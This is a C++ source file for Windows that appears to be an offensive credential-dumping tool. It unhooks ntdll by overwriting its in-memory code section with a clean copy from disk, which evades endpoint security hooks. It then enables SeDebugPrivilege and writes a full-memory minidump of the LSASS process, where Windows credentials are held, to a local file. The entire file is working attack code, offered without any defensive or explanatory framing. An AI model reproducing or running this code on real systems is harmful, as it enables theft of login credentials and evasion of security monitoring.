#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <iostream>

#pragma comment(lib, "dbghelp.lib")

BOOL AddSeDebugPrivileges();
BOOL DumpLsassMemory();
BOOL UnhookNtdll();

int main()
{

    BOOL bResult = UnhookNtdll();
    if (!bResult) {
        printf("[-] Failed to unhook.\n");
        return 1;
    }
    else {
        printf("[+] ntdll is unhooked.\n");
    }

    bResult = AddSeDebugPrivileges();
    if (!bResult) {
        printf("[-] AddSeDebugPrivileges failed.\n");
        return 1;
    }
    else {
        printf("[+] AddSeDebugPrivileges success.\n");
    }

    bResult = DumpLsassMemory();
    if (bResult == TRUE) {
        printf("[+] DumpLsassMemory success.\n");
        return 1;
    }

    return 0;
}


BOOL DumpLsassMemory() {

    DWORD dwPID = 0;
    HANDLE hProcess;

    HANDLE hDumpFile = CreateFile(L"c:\\dev\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"lsass.exe") != 0) {
            Process32Next(hSnapshot, &processEntry);
        }
        dwPID = processEntry.th32ProcessID;
        printf("[+] LSASS PID is %d\n", processEntry.th32ProcessID);
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPID);
    if (hProcess != NULL) {
        printf("[+] Opened a handle to LSASS process.\n");
    }
    else {
        printf("[-] Could not get a handle to LSASS process: %d\n", GetLastError());
        return FALSE;
    }


    BOOL bResult = MiniDumpWriteDump(hProcess, dwPID, hDumpFile,
        MiniDumpWithFullMemory, NULL, NULL, NULL);

    if (bResult == TRUE) {
        printf("[+] LSASS dumped\n");
    }
    else {
        printf("[-] Failed to dump LSASS\n");
        return FALSE;
    }

    return TRUE;
}

BOOL AddSeDebugPrivileges() {

    DWORD dwPID = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed.\n");
        return FALSE;
    }

    HANDLE hToken = NULL;
    BOOL bResult = OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
        printf("[-] OpenProcessToken failed.\n");
        return FALSE;
    }

    LUID pDebugPriv;
    bResult = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &pDebugPriv);
    if (!bResult) {
        printf("[-] LookupPrivilegeValue failed.\n");
        return FALSE;
    }

    TOKEN_PRIVILEGES tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = pDebugPriv;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bResult = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, NULL, NULL, NULL);
    if (!bResult) {
        printf("[-] AdjustTokenPrivileges failed.\n");
        return FALSE;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    // Windows TRUE is 1 and FALSE is 0
    return TRUE;
}


BOOL UnhookNtdll() {
    
    HANDLE hCurrentProcess = GetCurrentProcess();
    
    MODULEINFO mi = {};
    HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
    BOOL bResult = GetModuleInformation(hCurrentProcess, hNtdllModule, &mi, sizeof(mi));
    if (!bResult) {
        printf("[-] GetModuleInformation failed.\n");
        return FALSE;
    }

    LPVOID pHookedNtdllBaseAddress = (LPVOID)mi.lpBaseOfDll;

    HANDLE hNtdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hNtdllFileMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(hNtdllFileMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)pHookedNtdllBaseAddress;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pHookedNtdllBaseAddress + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            LPVOID hookedVirtualAddressStart = (LPVOID)((DWORD_PTR)pHookedNtdllBaseAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
            SIZE_T hookedVirtualAddressSize = hookedSectionHeader->Misc.VirtualSize;
            DWORD oldProtection = 0;
            char* hookedBytes{ new char[hookedVirtualAddressSize] {} };
            memcpy_s(hookedBytes, hookedVirtualAddressSize, hookedVirtualAddressStart, hookedVirtualAddressSize);
            
            BOOL isProtected = VirtualProtect(hookedVirtualAddressStart, hookedVirtualAddressSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            LPVOID cleanVirtualAddressStart = (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
            char* cleanBytes{ new char[hookedVirtualAddressSize] {} };
            memcpy_s(cleanBytes, hookedVirtualAddressSize, cleanVirtualAddressStart, hookedVirtualAddressSize);

            memcpy_s(hookedVirtualAddressStart, hookedVirtualAddressSize, cleanVirtualAddressStart, hookedVirtualAddressSize);
            isProtected = VirtualProtect(hookedVirtualAddressStart, hookedVirtualAddressSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(hCurrentProcess);
    CloseHandle(hNtdllFile);
    CloseHandle(hNtdllFileMapping);
    FreeLibrary(hNtdllModule);

    printf("[+] Unhooking complete.\n");
    return TRUE;
}
